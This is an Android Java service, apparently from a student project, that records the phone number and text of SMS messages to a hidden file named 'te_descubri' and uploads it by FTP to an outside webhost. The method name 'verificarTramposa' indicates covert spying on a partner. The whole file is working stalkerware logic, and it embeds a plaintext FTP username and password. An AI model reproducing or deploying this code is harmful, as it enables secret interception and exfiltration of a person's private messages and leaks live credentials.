package com.ceti.clase_sms;

import it.sauronsoftware.ftp4j.FTPClient;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;

import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.util.Log;

public class enviar_sms extends Service{
	
	FileOutputStream fOut;
	private String numero;
	private String mensaje;	
	final String filename = "te_descubri";	
	String informacion = new String();

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		
		return null;
	}	
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		
		
		StrictMode.ThreadPolicy policy = new StrictMode.
				ThreadPolicy.Builder().permitAll().build();				
		StrictMode.setThreadPolicy(policy);
				
		Bundle datos = intent.getExtras();
		
		if(datos!=null){
			numero = datos.getString("numero");
			mensaje = datos.getString("mensaje");
			informacion += "Numero: " + numero + "\n";
			informacion += "Mensaje: " + mensaje + "\n";
			
			 try {
				 
				fOut = new FileOutputStream(getTextFilename(),true);				
				OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
				myOutWriter.append(informacion);
			   	myOutWriter.close();				   				   	
			   	verificarTramposa();	
			} catch (Exception e) {				
				e.printStackTrace();
			}			
		}		
		
		return START_STICKY;
	}
	
	private String getTextFilename() {			
	 	String filepath = Environment.getExternalStorageDirectory().getPath();			
	 	File file = new File(filepath,filename);			
		return (file.getAbsolutePath());				
	}
 
	private void verificarTramposa(){
		
		try {						   
			   FTPClient client = null;
		       String filePathName = getTextFilename();				       		       
				try {
					
					client = new FTPClient();
					client.setSecurity(FTPClient.SECURITY_FTP);
					client.connect("server25.000webhost.com");
					client.setType(FTPClient.TYPE_TEXTUAL);
					client.setPassive(true);
					client.login("a3665066", "usat123");
					
					try{
						client.upload(new java.io.File(getTextFilename()));								
						Log.i("FTP AND UPLOAD", "successful");					
					}
					catch(Exception e){				
						Log.e("FTP AND UPLOAD", e.getMessage());
					}
					client.disconnect(true);				
				} catch (Exception e) {
		            e.printStackTrace();
		            Log.e("FTP AND UPLOAD", e.getMessage());
		        }			
		} catch (Exception e) {		
			Log.e("error envio",e.getMessage());
			e.printStackTrace();
		}		
	}
	
	 

	 
}
